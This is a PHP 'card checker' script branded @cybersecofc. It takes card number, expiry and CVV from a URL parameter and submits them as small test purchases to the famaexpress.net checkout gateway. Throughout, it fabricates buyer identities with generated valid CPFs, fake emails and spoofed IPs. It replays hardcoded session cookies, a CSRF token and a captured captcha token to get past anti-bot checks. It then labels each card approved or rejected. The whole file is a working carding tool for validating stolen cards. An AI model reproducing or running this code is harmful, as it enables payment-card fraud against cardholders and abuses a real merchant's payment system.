<?php

sleep(rand(2, 5));

session_start();

// Configurações
define('BASE_URL', 'https://famaexpress.net');
define('GATEWAY_URL', BASE_URL . '/gatewaypay');
define('COOKIE_FILE', 'cookies.txt');
define('CSRF_FILE', 'csrf.txt');


if (isset($_GET['lista'])) {
    $lista = trim($_GET['lista']);
    $result = testar_cartao($lista);
    
    
    $response_time = isset($result['request_info']['response_time']) ? 
                    round($result['request_info']['response_time'], 2) . 's' : 'N/A';
    
    $formatted_response = [
        'error' => $result['error'],
        'success' => $result['success'],
        'actual_message' => $result['actual_message'],
        'message' => $result['message'] . ' @cybersecofc - Tempo: ' . $response_time
    ];
    
    echo json_encode($formatted_response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
} else {
    $formatted_response = [
        'error' => true,
        'success' => false,
        'actual_message' => '',
        'message' => 'Parâmetro "lista" não encontrado. Use: ?lista=cartao|mes|ano|cvv @cybersecofc'
    ];
    echo json_encode($formatted_response, JSON_PRETTY_PRINT);
}

function testar_cartao($lista) {
    // Separar dados do cartão
    $dados = explode('|', $lista);
    if (count($dados) < 4) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'Formato inválido. Use: cartao|mes|ano|cvv'
        ];
    }
    
    $cartao = trim($dados[0]);
    $mes = str_pad(trim($dados[1]), 2, '0', STR_PAD_LEFT);
    $ano_full = trim($dados[2]);
    $cvv = trim($dados[3]);
    
    
    if (strlen($ano_full) == 4) {
        $ano = substr($ano_full, -2);
    } else {
        $ano = $ano_full;
    }
    
    // Validar dados
    if (!preg_match('/^\d{16}$/', $cartao)) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'Cartão inválido (16 dígitos)'
        ];
    }
    if (!preg_match('/^\d{2}$/', $mes) || $mes < 1 || $mes > 12) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'Mês inválido (01-12)'
        ];
    }
    if (!preg_match('/^\d{2,4}$/', $ano_full)) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'Ano inválido'
        ];
    }
    if (!preg_match('/^\d{3,4}$/', $cvv)) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'CVV inválido (3-4 dígitos)'
        ];
    }
    
    
    $dados_unicos = gerar_dados_unicos();
    
    
    $result = fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos);
    
    // Analisar resposta
    return analisar_resposta($result);
}

function gerar_dados_unicos() {
    // Gerar CPF válido
    $cpf = gerar_cpf_valido();
    
    return [
        'email' => 'cyber' . rand(1000, 9999) . '@gmail.com',
        'nome' => 'cybersec ' . bin2hex(random_bytes(3)),
        'telefone' => '(31) 9' . rand(1000, 9999) . '-' . rand(1000, 9999),
        'cpf' => $cpf,
        'cpf_formatado' => substr($cpf, 0, 3) . '.' . 
                          substr($cpf, 3, 3) . '.' . 
                          substr($cpf, 6, 3) . '-' . 
                          substr($cpf, 9, 2),
        'ip' => '201.17.' . rand(200, 255) . '.' . rand(1, 255),
        'visitorID' => 'de60931a95f642345901b02508f4bb887bf80a54',
        'cart_token' => 'ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402',
        'payment_token' => 'cartpanda_cielo',
        'payment_id' => 'cc'
    ];
}

function gerar_cpf_valido() {
    $noveDigitos = '';
    for ($i = 0; $i < 9; $i++) {
        $noveDigitos .= rand(0, 9);
    }
    
    
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
        $soma += $noveDigitos[$i] * (10 - $i);
    }
    $resto = $soma % 11;
    $digito1 = ($resto < 2) ? 0 : 11 - $resto;
    
    
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
        $soma += $noveDigitos[$i] * (11 - $i);
    }
    $soma += $digito1 * 2;
    $resto = $soma % 11;
    $digito2 = ($resto < 2) ? 0 : 11 - $resto;
    
    return $noveDigitos . $digito1 . $digito2;
}

function get_cookies_fixos() {
    
    return 'cart_token=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           'cf_clearance=qPknS41I5KXNvLRXoW16mMv..kibIFAlU0xexl3i1Fk-1770563337-1.2.1.1-8uaIxhX74_PkJf3tveSPgExxQIspw2PuqPIuzwanMEhGkHV5OBS2q9dxwcLkmAu0fxFehK_tvv_S1nXqMsQ6rOrm2L7uGmK6nQJfg5cWgKSlxVdR4HMl30pXFCqyROcMFK_M2k1chEz9Vzh.MhPtwu.9C.g1e8SmZaEqHxYfKjwbbdgnVrmPn.HwOpdXlaiv3NkZTem0B42jGHuu2egDZQb.8z8IZyLyNTcs9yZdKEw; ' .
           'cp_visit_token=14874272466988a70a920629.68506472wnCUjUjy2W7RNCgGGYVXKA9sJzmm9cGt; ' .
           'cp_session_token=5971350026988a70a9212e5.476957782Mo8Rw5g3Fv3CYfet3jaoytQKdFMLq2g; ' .
           'recentViewsCartX=["2762926"]; ' .
           'session_ip=201.17.208.201; ' .
           'discount_popup=Sun, 08 Feb 2026 15:09:36 GMT; ' .
           '__kdtv=t%3D1770563358702%3Bi%3Dde60931a95f642345901b02508f4bb887bf80a54; ' .
           '_kdt=%7B%22t%22%3A1770563358702%2C%22i%22%3A%22de60931a95f642345901b02508f4bb887bf80a54%22%7D; ' .
           'visit_token=eyJpdiI6IjN6L1crclJKZWZiRWVxSFlXWFN2cUE9PSIsInZhbHVlIjoidmlDTE94MFJzUFNuOHA5S0xSSDJ6bzM2b2xaTEJsTk5uZERFbkh2QUhNYW5lTXEzVFpGQUcrUDQzczkxY3IxWHhXeTRLcDlKSFV0U1FyeFMvMmFyc3RoMnA2WFg3RDIzVkZKdkh0TE1WaWU4Y0R1RXNUakx0b2JKL1cwMkpxYUN0T3pxL0gyeU82N0p0N25oNTQwWHRBPT0iLCJtYWMiOiI5YjkwZTIzYjA1M2Y1NzcxMWFhODY3OWRiZTMyMjJhY2QwNTdlYTg5MTYyNjRhMmIzZDE0MDA3OTY4YzJiMTdlIiwidGFnIjoiIn0%3D; ' .
           'session_token=eyJpdiI6IlpvYzlpWTU3bVBjNWdhaVg3RTlQV1E9PSIsInZhbHVlIjoiakN6VlV2UVNRYXlvQ1I5ejhXazJHRmZTL1lWb2w2UVBWZFBRUExrdkRGZW9WWUp0ekt4d0t2TStYWFN3TlJieHdPRWhlYmdVL0xoQVV1cUZtZE52cUlFK3hiQnEyUVNpcUhzRmx2Mm1ET0NMSGkxMWI3TEFZVnV6N1FETEVkSDNTbTBYaElnMk9iRTZqbHhPbGNVajV3PT0iLCJtYWMiOiI0MzgzYjZlYTVjYjFjZjQyZTczMDdkZDlmNDllYjI0YWQwMjg1YzI0MWQzNTgyMDQ4NmNlM2UzNjUzOGQzZDQwIiwidGFnIjoiIn0%3D; ' .
           'd8c75579126eae00ca86a52a5dc1e5f28d15b6d8=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           'e5eba65ee79407e60721d67ce5e00e2ba7f90fc6=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           '21cdabf55053874a697a6c9fd42ea74a40b92680=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           '7687402b78c85957fe5dfed00f48cd92eccee220=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           'test_mode=false; ' .
           'fb_from_checkout=vr1clX70TA; ' .
           'popup_checkout=yes; ' .
           'popup_checkout_one_time=1; ' .
           'target_time=Tue, 10 Feb 2026 15:10:07 GMT; ' .
           'XSRF-TOKEN=eyJpdiI6ImM3dU1BZlc5OVZzSFRtV2FHcjA3YVE9PSIsInZhbHVlIjoidDJkeVEwYXpYdWdHZld5UEl4TXVxV0Era2lpWWlBa05TbmdWS2lqc2VKZzJOdHA3R1ViK1pXNGZib0RNeGJSZmJ0eElRRUpMQzRERTNTckFPVEFNZWVwRERHdkc0UEZPdXpGR3RFejB3blUxU0d1T0RVWW5NM3hkTWpzQTBVN2MiLCJtYWMiOiIyM2I1MDU1NjcxMzBhNTNmZjE0ZmVlMzFkMzc3NDBmMGRkMWJmNTgxZDA1NTMzYTg5NzNlODQ3MzhlNjU2ZGJlIiwidGFgIjoiIn0%3D; ' .
           'cartx_frontend_session=eyJpdiI6IjI4NmVtMlhOTVBiUWRNWGN6b3lWZUE9PSIsInZhbHVlIjoieDJWMUY1WXFIOUhYWmhDcGJzc1VKQVNEanppSXJJc04yOTZlZ0x6QkRxQ2lqQW9aUDhkY1ZWUTU0b1hwKys1NzJZNzBHVE5aVUlETHRNZ0pXQnFHZUVEQk5qUHhFRkdPd0k0NkZyY0ZhZDlReFBma3B5bldIUVVhd1BBQTlzTksiLCJtYWMiOiIzYTc3NDIzODBhOTlhMTc5YjVmMzIwYzNmNGEzNzdmM2UzZWYwYjk1MDc2ZDQ2MTRlMzMwMjU2YTQwYjExMDJkIiwidGFnIjoiIn0%3D; ' .
           '_gcl_au=1.1.1800741986.1770563338.790316472.1770563370.1770563457';
}

function get_captcha_token() {
    return '0.57ZGYEnQ7GqKHqqPx6M2nitzqV_G6mpYdsku0tM4bYHxs2jrt42-ibEGpOC84CxbixSa6DsavAzVlOYiN8905v8KPxKbuopsbfyESJ_ZuL5uc2rtp6Z3rOZDwkNWPYK78Q4sCrmBNRvHYmvCeuTHTIrG73ImoYe4P5NAeDSpck-a4R_Eifr_xGKpUFSeJ-kpwFvPp5klvDO36SnI3EiU46b4BBydpT_m5ukCF_uMM5IJe74LAMW2RG2b_5ywoBFyhpXhdQ_aLalWrMOhrfzC1_G-X_uRQ-LDQwuquRMQnMlV3WUfzhc4y9h6jjcWJrlRTxeCs7UW9J8q0rcKRyo99VL5Cgy13K9swBxBkzy_RBqsZHZu9k1oyPxzep26-rcSqkrrEL7QyJjHZA2UtZonYRstLqNxUY6A1v4cu04cZlHrqO_gZqqwVB1uUMY51hqkfjeDKyt7B0H-KXv4NT4rSAkJZtWvUx1Pv0L9ZeVjIMONxhmhW_Qp8NwDSoNmGN6x2pWrtcZZH5nFWZ8-o890N4AP-8MyJuuGqmGEKfLWaKHgA7nRLDy461XenIf9emsng_MKN8fkJ0rKd0-3oYxH4g_h-TeMLcBERMOt--1OnxcMSHcVsSXYFvKRKJxb_KmUf1KuYrgSUAPmMrYCE9dpnhXMlslAU4I3znhZasSBKUqwkj1exlublzqMOmCE3-FCwBJ-cE2XEYLfqhiTEqzQAvWtXZyQopRxwVdhixb3YHNCZViqh0Apblzc8BHQ3Q7jRbRnYRemX0TrTPBvsEJyG0htPwSrsrE6ODB60z8DD5urrpFaXI1glR_IwwddGXlKybq55b7tnsalmx2_LdUQYcnmhwT4DeX2YJI_zlEOGWZHlIwxZPCTRt15q9h5hs1iGVhH6ZYSlD8WtZntrx48SDtoJYnrmPB51REIaDr6d1vlJfzCRuQXRNTguYGxuLC2.BfnyPGQRMkZyCx5YoyfAlA.d565494768a8d85da9bc64aa0b44c9f97c35c6f6c3238362a9043ac0ec91d5cd';
}

function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
    $ch = curl_init();
    
    
    $boundary = '----WebKitFormBoundary' . bin2hex(random_bytes(8));
    
    
    $fields = [
        'current_route' => 'checkout',
        'cartpay_checkout' => '0',
        'cartpay_enabled' => '0',
        'cart_country_code' => 'BR',
        'is_global_market' => '0',
        'checkout_request_currency' => 'BRL',
        'cartTotalWeight' => '15000',
        'checkoutSubTotalPrice' => '2.99',
        'checkoutTotalPrice' => '2.99',
        'checkoutTotalPriceGlobal' => '0',
        'totalShippingPrice' => '0',
        'totalShippingPriceGlobal' => '0',
        'totalTax' => '0',
        'county' => '',
        'totalDiscount' => '0.00',
        'include_shipping_amount' => '',
        'discount_category' => '',
        'discountCode' => '0',
        'giftDiscountPrice' => '0',
        'giftDiscountCode' => '0',
        'shipping_gateway' => '0',
        'melhor_envio_service' => '0',
        'melhor_envio_company' => '0',
        'melhor_envio_packages' => '0',
        'paid_by_client' => '0',
        'custom_price' => '0',
        'digital_cart_items' => '1',
        'country_code' => '',
        'ocu_exists' => '0',
        'browser_ip' => $dados_unicos['ip'],
        'google_auto_fill' => '1',
        'google_auto_fill_shop_id' => '105025',
        'cf_state_code' => 'MG',
        'cf_state' => 'Minas Gerais',
        'src' => '',
        'reward_token' => '',
        'clearsale_session' => '[object HTMLInputElement]',
        'clearsale_key' => '',
        'couponCode' => '',
        'quantity' => '1',
        'email' => $dados_unicos['email'],
        'fullName' => $dados_unicos['nome'],
        'phoneNumber' => $dados_unicos['telefone'],
        'ficalNumber' => $dados_unicos['cpf_formatado'],
        'cnpjNumber' => '',
        'registrationNumber' => '',
        'zipcode' => '30130005',
        'city' => 'Belo Horizonte',
        'state' => 'MG',
        'address' => 'Rua da Bahia',
        'number' => '1000',
        'neighborhood' => 'Centro',
        'compartment' => '',
        'country' => 'Brasil',
        'cardNumber' => $cartao,
        'cardholderName' => 'cyber sec',
        'cardExpiryDate' => $mes . '/' . $ano,
        'securityCode' => $cvv,
        'installments' => '1',
        'ebanking' => 'Pix',
        'save_information' => '1',
        'docType' => 'CPF',
        'docNumber' => $dados_unicos['cpf'],
        'site_id' => 'MLB',
        'cardExpirationMonth' => $mes,
        'cardExpirationYear' => $ano,
        'paymentMethodId' => 'cc',
        'recover_source' => '',
        'alert_message_product_qty_not_available' => 'Não há estoque para os produtos que você está tentando comprar.',
        'alert_message_cart_is_empty' => 'Ops! Parece que seu carrinho está vazio.',
        'settingsCaptchaEnable' => '1',
        'settingsCaptchaType' => '1',
        'settingsCaptchaToken' => get_captcha_token(),
        'cf-turnstile-response' => get_captcha_token(),
        'sayswho' => 'Opera 126 - Desktop Windows',
        'addCCDiscountPrice' => '0',
        'payment_type' => 'cartpanda_cielo',
        'payment_token' => $dados_unicos['payment_token'],
        'visitorID' => $dados_unicos['visitorID'],
        'cart_token' => $dados_unicos['cart_token'],
        'paymentMethod' => 'cc',
        'abandoned_token' => 'null',
        'currency' => '',
        'payment_id' => $dados_unicos['payment_id']
    ];
    
    
    $body = '';
    foreach ($fields as $name => $value) {
        $body .= "--{$boundary}\r\n";
        $body .= "Content-Disposition: form-data; name=\"{$name}\"\r\n\r\n";
        $body .= "{$value}\r\n";
    }
    $body .= "--{$boundary}--\r\n";
    
    // Headers exatos do curl
    $headers = [
        'Host: famaexpress.net',
        'Cookie: ' . get_cookies_fixos(),
        'sec-ch-ua-platform: "Windows"',
        'x-csrf-token: yC9k3T2t1Yuv8TeB2J1ORhBdbJVFWUihASeTycnj',
        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile: ?0',
        'x-requested-with: XMLHttpRequest',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
        'accept: application/json, text/javascript, */*; q=0.01',
        'content-type: multipart/form-data; boundary=' . $boundary,
        'origin: https://famaexpress.net',
        'sec-fetch-site: same-origin',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://famaexpress.net/checkout',
        'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority: u=1, i'
    ];
    
    // Configurar cURL
    curl_setopt_array($ch, [
        CURLOPT_URL => GATEWAY_URL,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $body,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_ENCODING => 'gzip, deflate, br',
        CURLOPT_TIMEOUT => 30,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_HEADER => false,
        CURLINFO_HEADER_OUT => true,
    ]);
    
    // Executar requisição
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    $curlInfo = curl_getinfo($ch);
    
    curl_close($ch);
    
    return [
        'http_code' => $httpCode,
        'response' => $response,
        'curl_error' => $curlError,
        'curl_info' => $curlInfo
    ];
}

function analisar_resposta($result) {
    // Logar resposta bruta para debug
    $raw_response = $result['response'];
    $http_code = $result['http_code'];
    
    
    $response_data = json_decode($raw_response, true);
    
    if ($response_data && json_last_error() === JSON_ERROR_NONE) {
        
        $formatted = [
            'error' => isset($response_data['error']) ? (bool)$response_data['error'] : true,
            'success' => isset($response_data['success']) ? (bool)$response_data['success'] : false,
            'actual_message' => isset($response_data['actual_message']) ? $response_data['actual_message'] : '',
            'message' => isset($response_data['message']) ? $response_data['message'] : 
                        (isset($response_data['decline_message']) ? $response_data['decline_message'] : ''),
            'payment_status' => isset($response_data['payment_status']) ? $response_data['payment_status'] : '',
            'payment_actual_status' => isset($response_data['payment_actual_status']) ? $response_data['payment_actual_status'] : '',
            'decline_message' => isset($response_data['decline_message']) ? $response_data['decline_message'] : '',
            'thankyouID' => isset($response_data['thankyouID']) ? $response_data['thankyouID'] : '',
            'payment_id' => isset($response_data['payment_id']) ? $response_data['payment_id'] : '',
            'transaction_id' => isset($response_data['transaction_id']) ? $response_data['transaction_id'] : '',
            'authorization_code' => isset($response_data['authorization_code']) ? $response_data['authorization_code'] : '',
            'http_code' => $http_code,
            'gateway_response' => $response_data
        ];
        
        
        if (stripos($formatted['payment_status'], 'aprovado') !== false || 
            stripos($formatted['payment_actual_status'], 'approve') !== false ||
            stripos($formatted['message'], 'aprovado') !== false) {
            $formatted['error'] = false;
            $formatted['success'] = true;
            $formatted['status'] = 'APROVADO';
        } elseif (stripos($formatted['payment_status'], 'rejeitado') !== false || 
                 stripos($formatted['payment_actual_status'], 'reject') !== false ||
                 stripos($formatted['message'], 'negado') !== false ||
                 stripos($formatted['decline_message'], 'negado') !== false) {
            $formatted['error'] = true;
            $formatted['success'] = false;
            $formatted['status'] = 'REJEITADO';
        } else {
            $formatted['status'] = 'INDEFINIDO';
        }
        
    } else {
        
        $message = 'Resposta inválida do servidor';
        $status = 'ERRO';
        
        
        $patterns = [
            '/aprovado|approved|success/i' => 'APROVADO',
            '/negado|rejeitado|rejected|declined|failed/i' => 'REJEITADO',
            '/Cart Items Not Found/i' => 'CARRINHO_INVALIDO',
            '/invalid|invalido/i' => 'INVALIDO',
            '/error|erro/i' => 'ERRO'
        ];
        
        foreach ($patterns as $pattern => $pattern_status) {
            if (preg_match($pattern, $raw_response)) {
                $message = 'Status detectado: ' . $pattern_status;
                $status = $pattern_status;
                break;
            }
        }
        
        
        if (preg_match('/"message":"([^"]+)"/', $raw_response, $matches)) {
            $message = $matches[1];
        } elseif (preg_match('/<title>([^<]+)<\/title>/', $raw_response, $matches)) {
            $message = $matches[1];
        } elseif (strlen($raw_response) < 500) {
            $message = $raw_response;
        }
        
        $formatted = [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => $message,
            'payment_status' => 'Pagamento ' . strtolower($status),
            'payment_actual_status' => strtolower($status),
            'decline_message' => $message,
            'thankyouID' => '',
            'payment_id' => '',
            'transaction_id' => '',
            'authorization_code' => '',
            'http_code' => $http_code,
            'status' => $status,
            'raw_response_preview' => substr($raw_response, 0, 500)
        ];
    }
    
    
    $formatted['request_info'] = [
        'http_code' => $http_code,
        'curl_error' => $result['curl_error'],
        'response_time' => isset($result['curl_info']['total_time']) ? $result['curl_info']['total_time'] : 0
    ];
    
    return $formatted;
}
?>
